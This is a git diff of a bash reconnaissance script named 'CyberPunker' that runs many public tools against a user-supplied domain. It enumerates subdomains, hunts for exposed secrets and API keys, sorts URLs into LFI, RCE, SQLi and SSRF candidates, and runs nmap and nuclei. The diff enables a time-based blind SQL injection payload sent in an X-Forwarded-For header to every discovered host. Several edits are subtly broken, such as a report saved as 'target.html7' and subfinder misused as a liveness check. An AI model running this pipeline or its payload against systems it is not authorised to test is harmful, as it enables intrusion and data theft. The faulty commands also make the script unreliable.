@@ -23,11 +23,11 @@ print_big_letters() {
 # Usage example
 print_big_letters "CyberPunker" "${CYAN}"
 
-echo -e "${BLUE}${bold}---------------Code by Muarij Arshad and Muhammad Ibrahim---------------${RESET}"
+echo -e "${BLUE}${bold}---------------Code by Team ETA---------------${RESET}"
 
 # Colored "Cyberpunk" letter
 echo -e "${BLUE}${bold}**************          Hack the System!      *************       ${e}"
-echo -e "${BLUE}${bold}**************         Code By Cyber Punk     **************         ${RESET}" 
+echo -e "${BLUE}${bold}**************            CyberPunker     **************         ${RESET}" 
 #
 # selecting domain and targets
 read -p "Whats Your Domain :" target
@@ -64,12 +64,16 @@ cd $output
 cat * | uniq | anew uniq.txt
 rm -rf crt.txt  subenum.txt subfinder.txt assetfinder.txt findomain.txt
 echo "-------------------------------------------------------------------------"
+echo "Finding Secrets:"
+cat uniq.txt | cariddi -intensive -s -rua | anew sensitiveinfo.txt
+echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 echo "Finding Valid subdomains :"
-httpxx -l uniq.txt -o validsubdomains.txt
+subfinder -dL uniq.txt -o validsubdomains.txt
 echo "Taking Screenshots :"
 mkdir screenshots
-node ~/WebShot/screenshot.js -f validsubdomains.txt -o screenshots
+#node ~/WebShot/screenshot.js -f validsubdomains.txt -o screenshots
+eyewitness -f validsubdomains.txt -d subscreenshots
 echo "------------------------------------------------------------------------"
 echo "Finding JS files:"
 subjs -i validsubdomains.txt | anew subjs.txt
@@ -83,15 +87,15 @@ echo "Finding subdomain takeover:"
 subzy run --targets uniq.txt --timeout 30 --output subtake
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
-#echo "Checking for Header-Based-SQL-Injection:"
-#cat uniq.txt | httpxx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | anew headersqli.tx
+echo "Checking for Header-Based-SQL-Injection:"
+cat uniq.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | anew headersqli.tx
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 
 echo "-----------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 echo "Gathering urls using crawler tool"
-xargs -a uniq.txt -I@ sh -c 'crawler --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a crawler.txt
+xargs -a uniq.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,png,woff2,woff,eot,gif "@"' | tee -a crawler.txt
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 echo "using waybackurls"
@@ -114,27 +118,27 @@ cd cetagorized-urls
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 echo "cetagorizing urls:"
-cat uniqurl.txt | uro | anew filter.txt
+#cat uniqurl.txt | uro | anew filter.txt
 
-cat filter.txt | gfpatteren api-keys | anew api-keys.txt
+cat uniqurl.txt | gfpatteren api-keys | anew api-keys.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren lfi | anew lfi.txt
+cat uniqurl.txt | gfpatteren lfi | anew lfi.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren idor | anew idor.txt
+cat uniqurl.txt | gfpatteren idor | anew idor.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren rce | anew rce.txt
+cat uniqurl.txt | gfpatteren rce | anew rce.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren redirect | anew redirect.txt
+cat uniqurl.txt | gfpatteren redirect | anew redirect.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren secrets | anew secrets.txt
+cat uniqurl.txt | gfpatteren secrets | anew secrets.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren sqli | anew sqli.txt
+cat uniqurl.txt | gfpatteren sqli | anew sqli.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren ssrf | anew ssrf.txt
+cat uniqurl.txt | gfpatteren ssrf | anew ssrf.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren ssti | anew ssti.txt
+cat uniqurl.txt | gfpatteren ssti | anew ssti.txt
 echo "-------------------------------------------------------------------------"
-cat filter.txt | gfpatteren xss | anew xss.txt
+cat uniqurl.txt | gfpatteren xss | anew xss.txt
 echo "-------------------------------------------------------------------------"
 
 echo "Finding LFI"
@@ -151,17 +155,18 @@ cd ..
 mkdir IP
 cp uniq.txt  IP
 cd IP
-httpxx -l uniq.txt -ip  -o sb.txt
+dnsx -l uniq.txt -resp -o sb.txt
 echo "seprating IPS:"
 grep -Eo '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' sb.txt > validip.txt
 
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
-httpxx -l validip.txt -o httpx-ip.txt
+#httpx -l validip.txt -o httpx-ip.txt
+eyewitness -f validip.txt -d ipscreenshots
 echo "Enumerating Nmap Scan:"
  nmap -sT -Pn -sC -iL validip.txt -oX target.xml
-xsltproc target.xml -o target.html
+xsltproc target.xml -o target.html7
 echo "-------------------------------------------------------------------------"
 echo "-------------------------------------------------------------------------"
 cd ..
-cat validsubdomains.txt | nuclei -o nuclei.txt
+cat uniq.txt | nuclei -o nuclei.txt
